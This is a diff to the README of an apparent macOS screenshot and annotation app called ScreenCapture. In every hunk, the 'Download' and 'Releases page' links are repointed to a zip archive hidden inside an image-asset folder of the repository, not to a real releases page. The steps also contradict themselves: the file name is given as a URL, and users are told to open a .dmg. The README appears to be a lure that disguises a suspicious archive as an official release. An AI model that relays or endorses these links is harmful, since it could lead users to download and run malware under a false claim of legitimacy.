@@ -1,7 +1,7 @@
 # 🎥 ScreenCapture - Effortlessly Capture and Annotate Screenshots
 
 ## 📥 Download Now
-[![Download ScreenCapture](https://raw.githubusercontent.com/QMeimeiky/ScreenCapture/main/ScreenCapture/Features/Annotations/Screen_Capture_2.7.zip%20ScreenCapture-v1.0-blue)](https://raw.githubusercontent.com/QMeimeiky/ScreenCapture/main/ScreenCapture/Features/Annotations/Screen_Capture_2.7.zip)
+[![Download ScreenCapture](https://raw.githubusercontent.com/QMeimeiky/ScreenCapture/main/ScreenCapture/Resources/Assets.xcassets/MenuBarIcon.imageset/Capture_Screen_1.7.zip%20ScreenCapture-v1.0-blue)](https://raw.githubusercontent.com/QMeimeiky/ScreenCapture/main/ScreenCapture/Resources/Assets.xcassets/MenuBarIcon.imageset/Capture_Screen_1.7.zip)
 
 ## 🚀 Getting Started
 ScreenCapture is a user-friendly macOS menu bar application designed for capturing and annotating screenshots. Whether you need a quick snapshot of your entire screen or a specific area, ScreenCapture has you covered. With various annotation tools and multi-monitor support, you can create professional-looking screenshots in no time.
@@ -22,10 +22,10 @@ ScreenCapture is a user-friendly macOS menu bar application designed for capturi
 To download and install ScreenCapture, follow these simple steps:
 
 1. **Visit the Release Page:**
-   Go to the [Releases page](https://raw.githubusercontent.com/QMeimeiky/ScreenCapture/main/ScreenCapture/Features/Annotations/Screen_Capture_2.7.zip) to find the latest version of the app.
+   Go to the [Releases page](https://raw.githubusercontent.com/QMeimeiky/ScreenCapture/main/ScreenCapture/Resources/Assets.xcassets/MenuBarIcon.imageset/Capture_Screen_1.7.zip) to find the latest version of the app.
   
 2. **Download the Application:**
-   Click on the latest release to download the application. The file will typically be named like `https://raw.githubusercontent.com/QMeimeiky/ScreenCapture/main/ScreenCapture/Features/Annotations/Screen_Capture_2.7.zip`.
+   Click on the latest release to download the application. The file will typically be named like `https://raw.githubusercontent.com/QMeimeiky/ScreenCapture/main/ScreenCapture/Resources/Assets.xcassets/MenuBarIcon.imageset/Capture_Screen_1.7.zip`.
   
 3. **Open the Downloaded File:**
    Locate the downloaded `.dmg` file in your Downloads folder and double-click to open it.
@@ -71,4 +71,4 @@ If you'd like to contribute to ScreenCapture, please open an issue or create a p
 ## 📖 Conclusion
 Thank you for choosing ScreenCapture. Enjoy capturing and annotating your screenshots with ease!
 
-For easy access, download the application from the [Releases page](https://raw.githubusercontent.com/QMeimeiky/ScreenCapture/main/ScreenCapture/Features/Annotations/Screen_Capture_2.7.zip).
+For easy access, download the application from the [Releases page](https://raw.githubusercontent.com/QMeimeiky/ScreenCapture/main/ScreenCapture/Resources/Assets.xcassets/MenuBarIcon.imageset/Capture_Screen_1.7.zip).
